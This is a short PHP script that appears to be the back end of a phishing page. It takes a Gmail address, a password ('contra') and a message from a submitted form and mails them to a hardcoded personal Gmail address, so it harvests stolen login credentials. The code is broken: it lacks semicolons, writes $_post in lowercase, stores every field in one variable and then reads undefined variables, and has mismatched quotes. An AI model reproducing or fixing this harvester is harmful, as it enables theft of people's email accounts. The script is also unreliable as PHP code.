<?php
  $destino= "jostin54255@gmail.com"
  $nombre = $_post["Gmail"];
  $nombre = $_post["contra"];
  $nombre = $_post["mensaje"];
  $cotenido = "Gmail: " . $Gmail . "/ncontra: " . $contra " .$mensaje;
  mail ("$destino, "contacto", $cotenido);




  ?>